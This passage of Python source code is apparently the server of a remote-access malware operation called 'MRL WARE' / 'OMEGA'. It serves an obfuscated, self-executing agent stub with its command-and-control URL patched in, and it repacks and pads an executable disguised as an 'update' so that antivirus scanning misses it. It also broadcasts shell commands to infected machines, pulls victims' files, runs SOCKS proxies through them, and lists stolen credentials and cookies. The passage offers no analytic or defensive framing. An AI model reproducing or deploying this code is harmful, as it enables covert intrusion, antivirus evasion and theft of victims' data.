            "t": "user_update",
            "id": target_id,
            "is_banned": is_banned,
            "role": data.get("role"),
        }
    ).decode()
    for ws, u in list(PORTAL_USERS.items()):
        try:
            await ws.send_text(update_payload)
        except:
            pass

    if is_banned:
        # Force banned user's WebSocket closed (code=4003 = banned)
        for ws, u in list(PORTAL_USERS.items()):
            if u.get("id") == target_id:
                try:
                    await ws.send_text(orjson.dumps({"t": "banned"}).decode())
                except:
                    pass
                asyncio.create_task(ws.close(code=4003))
    return {"status": "ok"}


@app.get("/api/admin/audit-logs")
async def admin_audit_logs(request: Request, category: str = None, limit: int = 200):
    """Paginated audit log endpoint. Admin-only."""
    user_id = request.session.get("user_id")
    user = db.get_user(user_id) if user_id else None
    if not user or user["role"] != "admin":
        raise HTTPException(status_code=403)
    return db.get_audit_logs(category=category, limit=min(limit, 500))


@app.get("/api/admin/chat")
async def admin_get_chat(request: Request):
    user_id = request.session.get("user_id")
    user = db.get_user(user_id) if user_id else None
    if not user or user["role"] != "admin":
        raise HTTPException(status_code=403)
    return db.get_chat_history(limit=100)


@app.post("/api/admin/chat/delete")
async def admin_delete_chat(request: Request):
    user_id = request.session.get("user_id")
    user = db.get_user(user_id) if user_id else None
    if not user or user["role"] != "admin":
        raise HTTPException(status_code=403)
    data = await request.json()
    msg_id = data.get("id")
    if msg_id:
        try:
            import sqlite3

            with sqlite3.connect(db.db_path) as conn:
                conn.execute("DELETE FROM chat_messages WHERE rowid=?", (msg_id,))
                conn.commit()

            # Broadcast the deletion
            del_payload = orjson.dumps({"t": "chat_del", "id": msg_id}).decode()
            sys_payload = orjson.dumps(
                {
                    "t": "chat_msg",
                    "username": "SYSTEM",
                    "message": "Message deleted by Admin",
                    "ts": time.time(),
                    "user_id": "0",
                    "avatar": "",
                }
            ).decode()

            for ws in list(PORTALS):
                try:
                    await ws.send_text(del_payload)
                    await ws.send_text(sys_payload)
                except:
                    pass
        except Exception as e:
            raise HTTPException(status_code=500, detail=str(e))
    return {"status": "ok"}


@app.get("/api/pyclient")
async def serve_agent(request: Request):
    """Serves the OMEGA agent (omega_core.py) with URL patched + FUD wrapped."""
    host = request.headers.get("host", "localhost:8000")
    f_proto = request.headers.get("x-forwarded-proto", request.url.scheme)
    proto = "https" if f_proto == "https" or "railway.app" in host else "http"
    base_url = f"{proto}://{host}"
    print(f"[MRL] Payload requested via: {base_url}")

    agent_path = "omega_core.py"
    if not os.path.exists(agent_path):
        return Response("Agent file not found", status_code=404)

    try:
        with open(agent_path, "r", encoding="utf-8") as f:
            code = f.read()

        # [OMEGA-POLY] Add polymorphic junk code
        junk = f"\n# {rv()} {rv()} {rv()}\n"
        code += junk

        # Patch C2 URL (Find the hardcoded production URL and replace it with the requester's base_url)
        code = code.replace(
            'SERVER_URL = "https://web-production-43c07.up.railway.app"',
            f'SERVER_URL = "{base_url}"',
        )

        # FUD: LZMA + zlib + base64 polymorphic wrapper
        import lzma
        import zlib

        compressed = zlib.compress(lzma.compress(code.encode("utf-8")))
        payload = base64.b64encode(compressed).decode()

        v_b64 = "".join(random.choices(string.ascii_letters, k=8))
        v_lz = "".join(random.choices(string.ascii_letters, k=8))
        v_zl = "".join(random.choices(string.ascii_letters, k=8))
        v_pay = "".join(random.choices(string.ascii_letters, k=8))
        v_dec = "".join(random.choices(string.ascii_letters, k=8))

        stub = (
            f"import base64 as {v_b64}, lzma as {v_lz}, zlib as {v_zl}\n"
            f"{v_pay}='{payload}'\n"
            f"{v_dec}={v_lz}.decompress({v_zl}.decompress({v_b64}.b64decode({v_pay})))\n"
            f"exec({v_dec}.decode('utf-8'),globals())\n"
        )
        return Response(content=stub, media_type="text/plain")
    except Exception as e:
        return Response(f"Error: {e}", status_code=500)


@app.get("/api/payload")
async def serve_polymorphic_payload(request: Request):
    """
    Polymorphic Re-packing Engine (FUD).
    Pulls the base OmegaElite executable, appends a randomized payload signature,
    and forces the file size up dynamically to evade cloud static analysis.
    """
    exe_path = os.path.join(os.path.dirname(__file__), "dist", "OmegaElite_v4.exe")
    if not os.path.exists(exe_path):
        raise HTTPException(status_code=404, detail="Base payload not compiled.")

    try:
        with open(exe_path, "rb") as f:
            exe_data = bytearray(f.read())
            
        # 1. Polymorphic Signature Injection
        # We append a random 4KB block of junk data to the EOF. 
        # This instantly changes the SHA256/MD5 hash of the payload on every single download.
        junk_signature = os.urandom(4096)
        exe_data.extend(junk_signature)
        
        # 2. Dynamic File Inflation
        # Some AVs won't scan files over ~300MB. We pad the EXE to 355MB dynamically.
        target_size = 355 * 1024 * 1024
        current_size = len(exe_data)
        if current_size < target_size:
            padding_needed = target_size - current_size
            exe_data.extend(b'\x00' * padding_needed)

        # Serve the uniquely generated executable
        headers = {
            "Content-Disposition": f"attachment; filename=Omega_Update_{random.randint(1000,9999)}.exe"
        }
        return Response(content=bytes(exe_data), media_type="application/x-msdownload", headers=headers)
        
    except Exception as e:
        logger.error(f"[POLYMORPHIC ENGINE] Failed: {e}")
        raise HTTPException(status_code=500, detail="Re-packing failed.")


# ── NEW FEATURE APIS ──────────────────────────────────────────────────────────

@app.get("/api/stats")
async def api_server_stats(request: Request):
    """Real server CPU, RAM, disk stats."""
    user_id = request.session.get("user_id")
    if not user_id or not db.get_user(user_id):
        raise HTTPException(status_code=401)
    stats = {
        "nodes_online": len(CLIENTS),
        "portals_online": len(PORTALS),
    }
    if _psutil:
        stats["cpu_pct"]    = _psutil.cpu_percent(interval=None)
        stats["ram_pct"]    = _psutil.virtual_memory().percent
        stats["ram_used_gb"] = round(_psutil.virtual_memory().used / 1e9, 2)
        stats["ram_total_gb"] = round(_psutil.virtual_memory().total / 1e9, 2)
        disk = _psutil.disk_usage("/")
        stats["disk_pct"]   = disk.percent
        stats["disk_free_gb"] = round(disk.free / 1e9, 2)
    return stats


@app.get("/api/nodes/geo")
async def api_nodes_geo(request: Request):
    """Returns lat/lon/country/flag for all live nodes (for map pins)."""
    user_id = request.session.get("user_id")
    user = db.get_user(user_id) if user_id else None
    if not user:
        raise HTTPException(status_code=401)
    devices = db.get_devices(user_role=user["role"], user_id=user_id)
    pins = []
    for d in devices:
        if d.get("lat") and d.get("lon"):
            pins.append({
                "id":      d.get("id"),
                "lat":     d.get("lat"),
                "lon":     d.get("lon"),
                "city":    d.get("city", ""),
                "country": d.get("country", ""),
                "flag":    d.get("flag", ""),
                "hostname":d.get("hostname", d.get("id")),
                "status":  d.get("status", "Offline"),
                "ip":      d.get("public_ip", ""),
            })
    return pins


@app.post("/api/node/broadcast")
async def api_node_broadcast(request: Request):
    """Sends a command to ALL connected agents."""
    user_id = request.session.get("user_id")
    user = db.get_user(user_id) if user_id else None
    if not user:
        raise HTTPException(status_code=401)
    
    data = await request.json()
    dtype = data.get("type", "")
    
    # Audit mass action
    asyncio.create_task(
        audit(
            "action",
            f"broadcast_{dtype}",
            detail=f"Sent to {len(CLIENTS)} nodes",
            user=user,
            level="warn",
            ip=str(request.client.host),
        )
    )
    
    sent_count = 0
    # Map command type to agent protocol
    fwd = {"t": dtype}
    if dtype == "shell":
        fwd = {"t": "shell", "c": data.get("cmd", "")}
    elif dtype == "show_toast":
         fwd = {"t": "troll", "action": "show_toast", "value": data.get("msg", "System Update in Progress")}
    
    payload = orjson.dumps(fwd).decode()
    for client_id, ws in list(CLIENTS.items()):
        try:
            await ws.send_text(payload)
            sent_count += 1
        except:
            pass
            
    return {"sent": sent_count}


@app.get("/api/fs/ls")
async def api_fs_ls(request: Request, node_id: str, path: str = "/"):
    """Forward a directory listing request to a specific node via WebSocket."""
    user_id = request.session.get("user_id")
    user = db.get_user(user_id) if user_id else None
    if not user:
        raise HTTPException(status_code=401)
    if node_id not in CLIENTS:
        raise HTTPException(status_code=404, detail="Node offline")
    try:
        await CLIENTS[node_id].send_text(
            orjson.dumps({"t": "ls", "path": path}).decode()
        )
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))
    return {"status": "sent"}


@app.post("/api/fs/download")
async def api_fs_download(request: Request):
    """Tell a node to send a file (result arrives via WebSocket)."""
    user_id = request.session.get("user_id")
    user = db.get_user(user_id) if user_id else None
    if not user:
        raise HTTPException(status_code=401)
    body = await request.json()
    node_id = body.get("node_id")
    path    = body.get("path")
    if not node_id or not path:
        raise HTTPException(status_code=400)
    if node_id not in CLIENTS:
        raise HTTPException(status_code=404, detail="Node offline")
    try:
        await CLIENTS[node_id].send_text(
            orjson.dumps({"t": "download_file", "path": path}).decode()
        )
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))
    return {"status": "sent"}


@app.post("/api/fs/upload_url")
async def api_fs_upload_url(request: Request):
    """Tell a node to download a file from a URL and save it at a given path."""
    user_id = request.session.get("user_id")
    user = db.get_user(user_id) if user_id else None
    if not user:
        raise HTTPException(status_code=401)
    body = await request.json()
    node_id  = body.get("node_id")
    url      = body.get("url")
    dest     = body.get("dest", "")
    if not node_id or not url:
        raise HTTPException(status_code=400)
    if node_id not in CLIENTS:
        raise HTTPException(status_code=404, detail="Node offline")
    try:
        await CLIENTS[node_id].send_text(
            orjson.dumps({"t": "download_url", "url": url, "dest": dest}).decode()
        )
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))
    return {"status": "sent"}


@app.get("/api/vault")
async def api_get_vault(request: Request):
    """Retrieve all exfiltrated credentials and cookies for the Vault UI."""
    user_id = request.session.get("user_id")
    user = db.get_user(user_id) if user_id else None
    if not user:
        raise HTTPException(status_code=401)
    
    # Admins get everything, normal users might get nothing or only their own?
    # For now, Vault is an admin/global feature.
    return {"status": "ok", "vault": db.get_all_stolen_data()}


@app.post("/api/node/socks")
async def api_node_socks(request: Request):
    """Start or Stop SOCKS5 proxy on the server for a specific node."""
    user_id = request.session.get("user_id")
    user = db.get_user(user_id) if user_id else None
    if not user:
        raise HTTPException(status_code=401)
    
    body = await request.json()
    node_id = body.get("node_id")
    action  = body.get("action") # "start" or "stop"
    port    = body.get("port", 1080)
    
    if not node_id:
        raise HTTPException(status_code=400)
    
    if action == "start":
        res = await socks_manager.start_socks(node_id, port)
        asyncio.create_task(audit("action", "socks_start", target_id=node_id, detail=f"Port: {port}", user=user))
        return {"msg": res, "port": port}
    else:
        res = socks_manager.stop_socks(node_id)
        asyncio.create_task(audit("action", "socks_stop", target_id=node_id, user=user))
        return {"msg": res}


@app.post("/api/node/broadcast")
async def api_node_broadcast(request: Request):
    """Send a command to ALL connected nodes at once."""
    user_id = request.session.get("user_id")
    user = db.get_user(user_id) if user_id else None
    if not user or user["role"] not in ("admin", "operator"):
        raise HTTPException(status_code=403)
    body = await request.json()
    cmd_type = body.get("type")
    if not cmd_type:
        raise HTTPException(status_code=400)
    sent = 0
    payload = {k: v for k, v in body.items()}
    payload["t"] = cmd_type
    raw = orjson.dumps(payload).decode()
    for nid, ws in list(CLIENTS.items()):
        try:
            await ws.send_text(raw)
            sent += 1
        except:
            pass
    asyncio.create_task(audit(
        "action", f"broadcast_{cmd_type}",
        detail=f"Sent to {sent} nodes", user=user
    ))
    return {"sent": sent}

# ─────────────────────────────────────────────────────────────────────────────
app.mount("/static", StaticFiles(directory="static"), name="static")



@app.on_event("startup")
async def startup():
    async def janitor():
        while True:
            try:
                db.prune_stale(timeout=3600)
                db.prune_audit_logs(max_entries=100000)
                await manager.broadcast_devices(db)
            except:
                pass
            await asyncio.sleep(60)

    asyncio.create_task(janitor())
    print("MRL WARE | PRO SPACE GRAY ENGINE ACTIVE.")


if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)
